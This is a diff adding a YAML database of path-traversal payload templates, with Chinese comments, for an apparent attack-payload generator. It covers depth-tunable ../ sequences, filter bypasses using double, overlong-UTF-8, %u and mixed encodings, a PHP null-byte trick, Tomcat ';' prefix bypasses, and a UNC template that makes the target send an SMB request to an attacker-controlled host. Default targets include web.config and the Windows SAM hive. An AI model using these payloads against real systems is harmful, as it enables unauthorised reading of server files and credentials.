@@ -1,0 +1,297 @@
+ruleDB: v0.1.0
+# 路径穿越模板。content_type 用 file-path。
+#
+# `depth` 槽位是典型用法：`../` 要重复几次取决于目标路径层级，
+# 写成 1/2/3/5/8 几个档比让用户手打一串点斜杠可靠。
+
+templates:
+  - id: traversal.generic.linux
+    name: Linux 路径穿越
+    desc: 目标直接吃明文 ../ 时先用它，层数交给 depth 槽位调、不用自己数点斜杠。过滤把明文挡掉就换编码那两条，或试绝对路径
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["/", "/../", "/../../", "/../../../", "/../../../../", "/../../../../../"], default: "/../../../../"}
+    body: "<<depth>><<filepath>>"
+    vars: [filepath]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: traversal.generic.windows
+    name: Windows 路径穿越
+    desc: Windows 同时认 / 和 \，两者都试
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["\\", "\\..\\", "\\..\\..\\", "\\..\\..\\..\\", "\\..\\..\\..\\..\\"], default: "\\..\\..\\..\\..\\"}
+    body: "<<depth>><<filepath>>"
+    vars: [filepath]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: traversal.generic.absolute
+    name: 绝对路径
+    desc: 应用直接拼接路径时，给绝对路径可以完全绕过相对层级
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: "/<<filepath>>"
+    vars: [filepath]
+    requires: [weak-filter]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: traversal.generic.encoded.url
+    name: URL 编码穿越
+    desc: 单层 URL 编码，绕开只看明文 ../ 的过滤
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["/", "/%2e%2e/", "/%2e%2e/%2e%2e/", "/%2e%2e/%2e%2e/%2e%2e/"], default: "/%2e%2e/%2e%2e/%2e%2e/"}
+    body: "<<depth>><<filepath>>"
+    vars: [filepath]
+    requires: [weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: traversal.generic.encoded.double
+    name: 双重 URL 编码穿越
+    desc: 应用会解码一次时用这层
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["/", "/%252e%252e/", "/%252e%252e/%252e%252e/",
+                        "/%252e%252e/%252e%252e/%252e%252e/",
+                        "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/"],
+              default: "/%252e%252e/%252e%252e/%252e%252e/"}
+    body: "<<depth>><<filepath>>"
+    vars: [filepath]
+    requires: [weak-filter]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: traversal.generic.dotdot.bypass
+    name: 穿越序列变形
+    desc: 过滤把 ../ 整个删掉时，删一次后剩下的正好拼回 ../。层数按目标路径深度调
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      # 层数是**实打实要按目标调**的参数。以前 body 里硬写三份 <<form.seq>>，
+      # 想改层数只能改数据文件——现在交给 <<rep>>。
+      depth: {options: ["1", "2", "3", "4", "5", "6", "8"], default: "3"}
+      form:
+        options:
+          - {id: nested,  name: "....// （删一次后还原）", seq: "....//"}
+          - {id: dot_slash, name: "..;/", seq: "..;/"}
+          - {id: overlong, name: "..%c0%af 过长 UTF-8", seq: "..%c0%af"}
+          - {id: backslash, name: "..\\ （Windows）", seq: "..\\"}
+        default: nested
+    body: "<<rep(depth,form.seq)>><<filepath>>"
+    vars: [filepath]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: traversal.generic.nullbyte
+    name: 空字节截断
+    desc: 白名单只检查扩展名时，用空字节把后面的后缀截掉。PHP 5.3.4 之后已修复
+    vuln: [traversal]
+    content_type: [file-path]
+    component: [php]
+    version: "<5.3.4"
+    slots:
+      # 只收编码写法。原始 NUL 字节表达不了（载荷是文本串），
+      # 而且实际发 HTTP 请求时本来也要写成 %00。
+      depth: {options: ["/../", "/../../", "/../../../", "/../../../../", "/../../../../../"],
+              default: "/../../../../"}
+      ext:   {options: ["%00", "%2500"], default: "%00"}
+      # 白名单校验的那个后缀。原来写死 .jpg，但目标白名单要求什么后缀就得跟什么
+      # ——它只是拿来骗过校验的，和真正读到的文件无关。
+      fake:  {options: [".jpg", ".png", ".gif", ".txt", ".pdf"], default: ".jpg"}
+    body: "<<depth>><<filepath>><<ext>><<fake>>"
+    vars: [filepath]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: traversal.generic.unc
+    name: UNC 路径
+    desc: Windows 下走 UNC 会触发 SMB 请求，既能读文件也能带外
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: "\\\\<<lhost>>\\<<share>>\\<<filepath>>"
+    vars: [lhost, share, filepath]
+    requires: [outbound, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: traversal.generic.windows.absolute
+    name: Windows 绝对路径
+    desc: 相对层级猜不准时直接给绝对路径。Windows 同时认正反斜杠，写正斜杠在 URL 里更省事
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      drive:  {options: ["C:", "D:"], default: "C:"}
+      target:
+        options: ["Windows/win.ini", "Windows/System32/drivers/etc/hosts", "boot.ini",
+                  "inetpub/wwwroot/web.config", "Windows/System32/config/SAM"]
+        default: "Windows/win.ini"
+    # drive 的取值**自带冒号**（`C:`），这里再补一个就成了 `C::/`——手推期望值时抓到的
+    body: "<<drive>>/<<target>>"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: traversal.generic.encoded.mixed
+    name: 混合编码穿越
+    desc: 只过滤了 %2e%2e 或只过滤了明文层级时，两种写法混着用。过滤规则越具体越容易被这样绕开
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["/..%2f", "/..%2f..%2f", "/..%2f..%2f..%2f", "/%2e%2e/..%2f",
+                        "/..%252f"],
+              default: "/..%2f..%2f..%2f"}
+    body: "<<depth>><<filepath>>"
+    vars: [filepath]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: traversal.generic.overlong.utf8
+    name: 过长 UTF-8 编码穿越
+    desc: 过滤只认明文 `../`（或只认 `%2e%2e`）、而后面的解码器**认过长编码**时用——`%c0%ae` 会被折叠成 `.`、`%c0%af` 折叠成 `/`，过滤看不到它们。**成败全在解码链**：IIS 5/6、老的 Java/JSP 容器、部分 WAF 认这一套；现代 Nginx 和 JDK 7u40+ 默认直接拒绝过长编码（回 400），在新栈上这条只会得到 400 而不是 404。先拿一个确定存在的文件验证通不通，再拿它去读目标文件。层级用 depth 调，别自己数序列
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["1", "2", "3", "4", "5", "6", "8"], default: "3"}
+      form:
+        options:
+          - {id: dot_overlong, name: "点和斜杠都过长（%c0%ae%c0%ae%c0%af）", seq: "%c0%ae%c0%ae%c0%af"}
+          - {id: e0_3byte,     name: "3 字节过长（%e0%80%ae%e0%80%ae%e0%80%af）", seq: "%e0%80%ae%e0%80%ae%e0%80%af"}
+          - {id: f0_4byte,     name: "4 字节过长（%f0%80%80%ae…）",        seq: "%f0%80%80%ae%f0%80%80%ae%f0%80%80%af"}
+          - {id: slash_only,   name: "只有斜杠过长（..%c0%af）",            seq: "..%c0%af"}
+        default: dot_overlong
+    body: "<<rep(depth,form.seq)>><<filepath>>"
+    vars: [filepath]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: traversal.generic.unicode
+    name: 16 位 Unicode 编码穿越
+    desc: 两种只在特定栈上成立的形态。`%uXXXX` 是 **IIS / ASP.NET 专有**的解码语法（`%u2215` 是斜杠、`%u002e` 是点），Apache/Nginx 收到会当成四个普通字符；全角形态（`．` U+FF0E、`／` U+FF0F）在**做过 Unicode 归一化（NFKC/NFKD）**的应用上会被折叠回 `../`，只有「归一化之后没再做二次校验」时才成立。两个都不是通用绕法，先看目标是什么栈再用，别在 Nginx+PHP 上浪费时间
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["1", "2", "3", "4", "5", "6", "8"], default: "3"}
+      form:
+        options:
+          - {id: iis_u2215, name: "IIS %u2215（斜杠用 %u 写）",            seq: "..%u2215"}
+          - {id: iis_u002e, name: "IIS %u002e%u002e%u2215（点也用 %u）",  seq: "%u002e%u002e%u2215"}
+          - {id: iis_u002f, name: "IIS %u002e%u002e%u002f",               seq: "%u002e%u002e%u002f"}
+          - {id: fullwidth, name: "全角 ．．／（NFKC 折叠）",               seq: "%uff0e%uff0e%uff0f"}
+        default: iis_u2215
+    body: "<<rep(depth,form.seq)>><<filepath>>"
+    vars: [filepath]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: traversal.generic.encoded.multi
+    name: 多层编码混排穿越
+    desc: 把两种以上编码**混在同一串里**。过滤通常只针对某一种形态做替换或正则（只删明文 `../`、只解一次 `%2e`），混排后每种形态单独看都不完整，规则匹配不到；而真正的解码链逐层解完仍然是 `../`。**要先把解码层数试出来**——`traversal.generic.encoded.double` 能通就说明解两层，这条里那些双重编码的段才有意义；只解一层的目标上，双重编码段会原样留在路径里导致 404，那不是被拦了而是拼错了
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["1", "2", "3", "4", "5"], default: "3"}
+      form:
+        options:
+          - {id: dot_plain_slash_double, name: "点明文 + 斜杠双重编码（..%252f）",        seq: "..%252f"}
+          - {id: dot_url_slash_double,   name: "点单编 + 斜杠双编（%2e%2e%252f）",        seq: "%2e%2e%252f"}
+          - {id: dot_double_slash_plain, name: "点双编 + 斜杠明文（%252e%252e/）",        seq: "%252e%252e/"}
+          - {id: mixed_three,            name: "三种混排（../%252e%252e/%2e%2e%252f）",   seq: "../%252e%252e/%2e%2e%252f"}
+          - {id: overlong_url_mix,       name: "过长 UTF-8 + URL 编码混排（..%c0%af%2e%2e%2f）", seq: "..%c0%af%2e%2e%2f"}
+        default: dot_plain_slash_double
+    body: "<<rep(depth,form.seq)>><<filepath>>"
+    vars: [filepath]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: traversal.generic.matrix
+    name: 矩阵参数（分号）绕过前缀校验
+    desc: 网关按**前缀**放行（`/static/`、`/api/` 这类公开目录）、后端是 Tomcat / Spring 时用：`;` 之后的部分被后端当矩阵参数丢掉，于是 `..;/` 在后端眼里变回 `..`，而代理看到的是原样带着 `;` 的路径——两边对「这是不是 /static 下面」的判断不一致，前缀校验就被绕过了。**这是 `/..;/` 的前缀版**：单纯重复 `..;/` 的写法见 `traversal.generic.dotdot.bypass`（那条解决「过滤只删了一次」），这条解决「代理按前缀放行」。只对把 `;` 当矩阵参数处理的栈成立，Nginx + 其他后端时 `..;/` 只是个普通目录名，会 404
+    vuln: [traversal]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      form:
+        options:
+          - {id: semicolon,     name: "..;/（Tomcat 矩阵参数）", seq: "..;/"}
+          - {id: semicolon_enc, name: "..%3b/（分号编码）",       seq: "..%3b/"}
+        default: semicolon
+      depth: {options: ["1", "2", "3", "4"], default: "2"}
+    # prefix 做成变量而不是槽位：网关放行的是哪个前缀完全取决于目标，
+    # 枚举不出来（/static 只是最常见的那个），所以留成自由文本。
+    # 前缀和序列之间那个 `/` 写在 body 里，不放进 seq——seq 自带前导斜杠的话
+    # 每重复一次就会多出一个空路径段（`/..;//..;/`），白给目标一个 404 的理由。
+    body: "<<prefix>>/<<rep(depth,form.seq)>><<filepath>>"
+    vars: [prefix, filepath]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
